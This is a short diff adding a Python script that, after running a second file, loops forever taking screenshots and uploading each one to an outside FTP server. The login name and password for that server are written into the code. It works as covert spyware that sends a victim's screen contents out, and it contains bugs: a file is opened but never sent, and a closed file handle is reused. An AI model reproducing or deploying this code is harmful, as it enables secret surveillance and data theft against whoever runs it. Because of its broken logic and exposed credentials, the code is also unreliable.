@@ -1,0 +1,17 @@
+import time
+import pyscreenshot
+import ftplib
+time.sleep(5)
+execfile('t.py')
+while True:
+	pyscreenshot.grab()
+	pyscreenshot.grab_to_file('hello.png')
+	session = ftplib.FTP('ftp.geocities.ws','pluman','kaiser080999')
+	session.cwd("fah")
+	file = open('hello.png','rb')
+	file2= open('output.txt','rb')
+	session.storbinary('STOR hello.png', file)     
+	file.close()  
+	file2= open('output.txt','rb')
+	session.storbinary('STOR hello.png', file)	
+	session.quit()
